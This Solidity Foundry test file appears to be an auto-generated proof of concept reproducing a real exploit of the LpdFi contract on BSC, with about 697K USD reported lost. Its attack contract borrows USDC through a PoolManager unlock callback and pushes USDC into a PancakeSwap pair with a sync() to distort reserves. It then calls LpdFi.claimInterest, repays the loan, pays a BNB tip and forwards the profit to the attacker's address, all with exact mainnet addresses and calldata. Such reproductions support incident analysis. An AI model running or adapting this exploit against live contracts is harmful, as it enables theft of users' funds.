// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : 696.95K USD
// Attacker : 0x5d289266d85ef671561ba3f253fb79327c193f33
// Attack Contract : 0x7f5ad0a998dcb3f5006f0d152bebc055979ef711
// Vulnerable Contract : 0xce6a6e4413d85a136bbac8aae6fb46eaa77f295e
// Attack Tx : 0x70bbe0aa3c7ef149ecb6128a06025885deaa8fef3f393a505d447d28ab3315d6
// Block : 113613924
// Chain : BSC
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 689.39K USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_path_entry;
    uint256 constant FORK_BLOCK = 113613923;
    uint256 constant TX_TIMESTAMP = 1785686400;
    uint256 constant TX_BLOCK_NUMBER = 113613924;
    uint256 constant TX_VALUE = 0;

    uint64 constant ATTACKER_EOA_TX_NONCE = 3;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            // Exact-address fallback for observed CREATE/CREATE2 and callback surfaces.
            vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        return address(0);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        _expectProfit(Addresses.A_484848_4848, address(0), Addresses.ZERO, "BNB", 6806855476373864617);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDC, "USDC", 689529793138448987344168);
    }
}

contract OurAttack {
    function attack() public payable {
        IERC20Like(Addresses.USDC).balanceOf(Addresses.PoolManager);
        bytes memory poolManagerUnlockCallArgs =
            hex"000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000008ac76a51cc950d9822d68b83fe1ad97b32cd580d000000000000000000000000000000000000000000009ab65366444be4934d870000000000000000000000005d289266d85ef671561ba3f253fb79327c193f3300000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000"; // observed calldata selector 0x48c89491 split from ABI tail bytes // artifact calldata preserved: abi_call; preserving observed calldata; action_graph action_0001 has artifact-backed dynamic_bytes_payload_precondition; preserving exact calldata before ABI re-encoding
        (bool poolManagerUnlockCallSucceeded,) =
            Addresses.PoolManager.call(bytes.concat(bytes4(0x48c89491), poolManagerUnlockCallArgs));
        require(poolManagerUnlockCallSucceeded, "observed raw calldata 0x48c89491 failed");
        IERC20Like(Addresses.USDC).approve(Addresses.PancakeRouter, 4000000000000000000000);
        uint256 swapAmountIn = 4000000000000000000000;
        if (swapAmountIn != 0) {
            IPancakeRouter(Addresses.PancakeRouter)
                .swapExactTokensForETH(
                    swapAmountIn,
                    0,
                    _addressArray3(Addresses.USDC, Addresses.USDT, Addresses.WBNB),
                    address(this),
                    1785686400
                );
        }
        bool a4848484848ReceiveSucceeded;
        (a4848484848ReceiveSucceeded,) = payable(Addresses.A_484848_4848).call{value: 6806855476373864617}(""); // artifact native value transfer with empty calldata; pseudocode raw_call action_0004 line 148 requires exact artifact calldata
        require(a4848484848ReceiveSucceeded, "observed native receive transfer failed");
        uint256 usdcBalanceOfAttackPathEntry = IERC20Like(Addresses.USDC).balanceOf(address(this));
        IERC20Like(Addresses.USDC).transfer(Addresses.attacker_eoa, usdcBalanceOfAttackPathEntry);
    }

    function _unlockCallback() internal {
        uint256 takeFlowAmount = 730607755349186021903751;
        IPoolManager(Addresses.PoolManager).take(Addresses.USDC, address(this), takeFlowAmount);
        IERC20Like(Addresses.Cake_LP_F210).totalSupply();
        ICake_LP_F210(Addresses.Cake_LP_F210).getReserves();
        IERC20Like(Addresses.Cake_LP_F210).balanceOf(Addresses.LpdFi);
        IERC20Like(Addresses.USDC).transfer(Addresses.Cake_LP_F210, 3440992868050644998878);
        ICake_LP_F210(Addresses.Cake_LP_F210).sync();
        ILpdFi(Addresses.LpdFi).claimInterest(0);
        IPoolManager(Addresses.PoolManager).sync(Addresses.USDC);
        IERC20Like(Addresses.USDC).transfer(Addresses.PoolManager, 730607755349186021903751);
        IPoolManager(Addresses.PoolManager).settle();
    }

    function _handleCallback() internal {}

    receive() external payable {}

    function unlockCallback(bytes calldata arg0) external payable {
        if (!_replayActive[REPLAY_CALLBACK_2]) {
            _replayActive[REPLAY_CALLBACK_2] = true;
            _unlockCallback();
            _replayActive[REPLAY_CALLBACK_2] = false;
        }
        bytes memory ret = abi.encode(_uintArray0());
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
    }

    bytes32 private constant REPLAY_CALLBACK_2 = keccak256("poc.replay.REPLAY_CALLBACK_2");
    mapping(bytes32 => bool) private _replayActive;

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _uintArray0() internal pure returns (uint256[] memory out) {
        out = new uint256[](0);
    }

    function _addressArray3(address a0, address a1, address a2) internal pure returns (address[] memory out) {
        out = new address[](3);
        out[0] = a0;
        out[1] = a1;
        out[2] = a2;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // Addresses.PancakeRouter = 0x10ed43c718714eb63d5aa57b78b54704e256024e label=PancakeRouter roles=code_contract|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant PoolManager = 0x28e2Ea090877bF75740558f6BFB36A5ffeE9e9dF; // Addresses.PoolManager = 0x28e2ea090877bf75740558f6bfb36a5ffee9e9df label=PoolManager roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant A_484848_4848 = 0x4848489f0b2BEdd788c696e2D79b6b69D7484848; // Addresses.A_484848_4848 = 0x4848489f0b2bedd788c696e2d79b6b69d7484848 label=0x4848489f0b2bedd788c696e2d79b6b69d7484848 roles=code_contract|contract|economic_holder|observed_address|profit_holder|recipient|storage_contract source=asset_delta.profit_candidates confidence=medium
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955; // Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=BEP20USDT token_symbol=USDT roles=asset|contract|observed_address|recipient|token_related source=etherscan_v2 confidence=high
    address internal constant attacker_eoa = 0x5d289266d85EF671561bA3F253FB79327C193f33; // Addresses.attacker_eoa = 0x5d289266d85ef671561ba3f253fb79327c193f33 label=attacker_eoa roles=attacker_eoa|contract|economic_holder|observed_address|profit_holder|recipient|sender source=tx_metadata.from confidence=high
    address internal constant attack_path_entry = 0x7f5AD0A998Dcb3f5006F0D152BEBC055979EF711; // Addresses.attack_path_entry = 0x7f5ad0a998dcb3f5006f0d152bebc055979ef711 label=attack_path_entry roles=attack_path_entry_contract|attacker_callback_contract|attacker_contract|code_contract|contract|localized_contract|observed_address|poc_reconstruction_surface|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant Cake_LP_F210 = 0x85346d31743796F7d00D675629e32783A968F210; // Addresses.Cake_LP_F210 = 0x85346d31743796f7d00d675629e32783a968f210 label=PancakePair token_symbol=Cake-LP roles=asset|contract|observed_address|recipient|sender|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d; // Addresses.USDC = 0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d label=BEP20UpgradeableProxy token_symbol=USDC roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|token_related source=etherscan_v2 confidence=high
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // Addresses.WBNB = 0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c label=WBNB token_symbol=WBNB roles=asset|contract|observed_address|recipient|sender|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant LpdFi = 0xcE6A6e4413D85A136bBaC8AaE6fB46eAa77F295e; // Addresses.LpdFi = 0xce6a6e4413d85a136bbac8aae6fb46eaa77f295e label=LpdFi roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
}

interface ICake_LP_F210 {
    function getReserves() external view;
    function sync() external;
}

interface ILpdFi {
    function claimInterest(uint256) external;
}

interface IPancakeRouter {
    function swapExactTokensForETH(uint256, uint256, address[] calldata, address, uint256)
        external
        returns (uint256[] memory);
}

interface IPoolManager {
    function settle() external returns (uint256);
    function sync(address) external;
    function take(address, address, uint256) external;
    function unlock(bytes calldata) external returns (uint256[] memory);
    function sync() external;
}

